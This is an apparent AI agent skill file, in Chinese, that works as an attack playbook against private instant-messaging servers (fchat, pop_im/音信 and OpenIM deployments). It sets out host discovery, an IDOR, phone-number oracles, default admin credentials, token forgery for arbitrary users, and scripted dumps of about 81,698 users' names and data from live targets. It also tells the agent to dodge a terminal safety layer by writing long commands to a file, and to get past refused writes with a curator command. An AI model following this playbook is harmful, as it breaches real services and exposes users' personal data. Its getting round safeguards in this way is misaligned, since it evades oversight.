---
name: chinese-private-im
description: "Use for 中国私有 IM:企业号分服(fchat/即联达/轻序)+音信/pop_im 系."
version: 1.1.0
tags: [im, flutter, enterprise, 即联达, 轻序协同, fchat, apk, popim, yinxin, workerman, uni-app]
---

# 中国私有 IM · 企业号分服 + pop_im 系

Flutter `fchat` + Go `libgojni`（mxl）类 IM：登录前要企业号/服务器ID/频道链接/网关。
第二支 = **pop_im / 音信**（PHP Workerman+GatewayWorker、uni-app H5，无企业号概念：设备头+图形码+邀请码链）→ 全链见 `references/popim-yinxin-im.md`。
**主目标 = 企业号→真 API host**，再 dump 会员/历史注册。用户给企业号表 = 分服钥匙，禁止改去喷密码。

交叉：APK 细节走 `reverse-skill`→`apk-reverse`；活靶纪律走 `pentest-execution`（二者若写入被拒，先 `hermes curator adopt`）。

## When to Use

- 即联达 / 轻序协同 / E飞讯 / jjgt / qxxt / fchat / libgojni
- 「企业号」「服务器ID」「加入服务器」「开版」
- APK 里出现 `requestFromEnterpriseCode`、`server_connect`、`/app/base`
- 音信 / pop_im / wks-webman-chat / GatewayWorker；`X-D-ID`、`YIN_XIN_IM`、com.wcloud.yinxinim
- 错误串「设备参数缺失」「非法设备，请重新登录」「邀请码不存在」

Don't use for: 普通 Web 发卡/博彩（走对应伞形）；已拿到真 host 后的纯 Web 注入（转 `hack-skills`/`web-sec`）。

## ACTION REQUIRED

1. `NOW`: 读 `references/flutter-im-enterprise-host.md`（指纹/误报黑名单/探测序）
2. `NOW`: 企业号入库；COS 壳与泛解析先排除
3. `NEXT`: 抠 libapp/libgojni → 候选 host 上打 `/app/base` `/app/conf`
4. `ACT`: 真网关 JSON/业务错出现后再跟分服 dump；开发者库弱口令仅补充旁路

## 快路径

```bash
# APK → so
unzip -l app.apk | rg 'libapp.so|libgojni.so'
# 企业连接符号
rg -a 'requestFromEnterpriseCode|enterpriseCodeNotExist|server_connect|/app/base' libapp.so
# 泛解析烟测（随机子域 vs 企业号子域）
dig +short randomxyz123.SUFFIX A; dig +short 886.SUFFIX A
```

## Pitfalls

- `*.mpk3s.cn` / `*.cwiaf.cn` Host 403 = COS，不是 API
- **COS 整桶 451 `UnavailableForLegalReasons`**：连随机 key 也 451 ≠ 对象命中；用区域源站对照，或对照已知 `NoSuchKey` 桶
- **POST `/v2/app/base` 对 COS 回 405** 常是 MethodNotAllowed 壳反应，**不要**当成「键存在」；改 GET 看 `NoSuchKey`/`AccessDenied`/`451`
- `jild.cn`/`jilianda.com` = 隧道吉联达误报；`qingxu.cn` = 云计费路径撞车；`*.zgym.top`/`*.e.zwz.hk` = 泛解析停放
- POST `/app/base` → 200 空 body ≠ 成功
- APK 内嵌 RSA 私钥 ≠ 登录口令；官网 APK 与市场包 MD5 可能不同，以官网/Linktree 直链为准再抠 so
- Flutter AOT 伪域名噪声多，只留与 server_connect/OSS 共现的
- **同公司内容站 ≠ IM 网关**：隐私/ICP 扒出的 `jjld.cn` 类站可打穿（Druid/SPA），产出用户手机号等，但**不能**当成 `requestFromEnterpriseCode` 的分服 host
- SPA 登录体可能是 `{phone,password}`（UI 写「用户名」也照样 POST `phone`）——先读 JS，别盲喷 username
- 列表分页 `hasNextPage` 可能恒 `false`：必须跟 `pageInfo.pages` / `total` 翻页，否则会假完成
- mxl `CheckApp` URL 已还原形态：`https://{ossHost}/{name}.json?t={unix}`；`{name}` **往往不是**明文 `QXXT`/`APP`/`OSS`/`RSA`（这些多是同函数字面量/日志字段）——NoSuchKey 一批后优先 ADRP/长度还原，别空喷对象名

## pop_im / 音信 快链（Workerman+uni-app 支线）

- 认证三件套：设备头 `X-D-ID`(uuid) + `X-D-Type: mobile`（请求层自动注入；缺→「设备参数缺失」，不匹配→「非法设备」）→ 图形码 `GET /api/captcha`（{code_img, **captcha_id**}，ddddocr 可解）→ `POST /api/check {mobile,password,captcha,captcha_id,cid:"",login_type:"inside"}`
- 注册 `POST /api/join`：`captcha_type:2`(图片)/1(短信)、`captcha_id`、**invite_code 必须真实存在**（拿任一现有账号 `/api/pop/new_get` → `mine.invite_code`）；注册尾部 GatewayWorker 连接超时报错≠失败，用户可能已入库，直接试登录
- token 绑登录时的 X-D-ID：固定 DID 存盘复用（换 DID 会「非法设备」）；令牌表在 Redis（32hex 键 `{"uid":N,"type":"api|admin","token":JWT}`，admin 型常驻多枚）
- 免鉴权泄露：`/api/getSetting`（ws_address / TRTC appid / down_url / **home_notice 内部员工公告**）、`/api/user/detail?uid=`＝任意用户 IDOR、`/api/common/groupDetail?sign=`、`/api/downUrl`
- JWT issuer `wks-webman-chat-admin`（pwd=md5(密码) claim；admin/api 两型）：同系多部署共用，可作跨部署识别锚
- dev 实例弱口令高频（种子号 <PHONE-REDACTED>/123456、Redis `123456` 一发命中）；生产侧仍守极少量主题词纪律
- 生产前墙：Tencent EdgeOne **567 = IP 级封锁**（浏览器/Tor 都过不去；≠ JS 挑战，别上浏览器白费劲）
- 工程坑：长脚本别接 `| head`（SIGPIPE 会在落盘前杀脚本）；内联长命令被终端安全层拦 → 先 write_file 落脚本再跑

## OpenIM 自建系（OpenCorp 壳）——第三支（2026-10 智慧家园实测）

- 识别：Flutter + `package:openim*`/`openim_common`/`flutter_openim_sdk`（常配 media_kit/livekit/ffmpeg、红包/直播/会议/朋友圈=全功能社区版）；strings 出 `wss://<host>/msg_gateway`、`ws://<host>:10001`、`http://<host>:10002`、`http://<host>:10008`。
- 服务端形状：`/msg_gateway`=WS(10001)、`/api`=用户API(10002 反代)、`/chat`=**管理API(10008 反代)**；裸端口常防火墙关，只留 443 前缀路由；`/msg_gateway` 无参接 = `{"errCode":1602,...,"token is empty"}`（探活标记）。
- Web 控制台（壳名可换，如「OpenCorp」）：React SPA；**所有请求必带头 `operationID: <uuid4>`**（缺→「header must have operationID」），鉴权另加 `token` 头；端点族 `/account/login|register|code/send|code/verify|password/reset`、`/user/search/full`、`/user/find/full`。
- 注册=邀请制（`invitationCode`，NotFound 即无效）；`/account/code/send` **免鉴权**可发短信/邮件码（轰炸面）。
- **管理员线已破（2026-10-10 实证；推翻旧「secret 未中」结论）**：secret = **`openIM123`**（纯教程默认值——旧批次只试了 `openIM123456`/`OpenIM123456`/`openim123456` 等带 456 的长串，**漏了短串本身**；默认字典必含 `openIM123`）× admin userID = **`imAdmin`**（从错误预言机直读：错 ID 回 `userID is error., userID=admin, adminUserID=[imAdmin]`，即 admin 名可被逐字问出）。调用形：`POST /api/auth/get_admin_token`，**header 必带 `operationID`(uuid4) + `token`（占位 `x` 即可）**，body `{secret,userID}` → 出 admin JWT。
- **admin token 用途（实测）**：`POST /api/user/get_users {pagination:{pageNumber,showNumber}}` 全量枚举（实测 81,698 人：userID+昵称(多为真名)+头像+注册时间；`get_all_users_uids` 该部署 404——路由差异，用 get_users）；`POST /api/auth/get_user_token {platformID,userID}`（admin token 放 header）**给任意 userID 签登录票** = 全社区任人可帧；`/chat` 不服该 token（1505 TokenUnknownError，两套 token 空间独立）。
- **/chat 手机号 oracle**：`POST /chat/account/login {areaCode,phoneNumber,password,platform}` 未注册号回 `user unregistered: AccountNotFound`（先补 areaCode/platform 过格式门再当 oracle 用）。
- 可跑模板：`scripts/openim_admin_dump.py`（出 admin token → 分页 dump 全用户 → jsonl 落盘，实测 8 万级 164 页 0 失败）。
- 与会员盘关系：用户库常独立——scam 盘账号在 IM 登录回 `AccountNotFound` = 两边不通（各注册同号可比对）；会员盘发放的 8 位「家园邀请码」在 `/chat` 注册**无效**，别回头磨。
- 细节（端到端指纹、端点、错误文案、词表、**2026-10-10 管理员拿下全链**）：`references/openim-opencorp-deployment.md`

## References

- `references/flutter-im-enterprise-host.md` — 完整指纹、误报表、攻击序、mxl JNI、同公司旁路、CheckApp URL
- `references/jjld-cn-same-company-bypass.md` — jjld.cn Druid/SPA 超管与 dump 参数
- `references/popim-yinxin-im.md` — pop_im/音信 全链：认证载荷、Redis 键谱、PHP 会话伪造、主机层端口谱、边界判定、工程坑
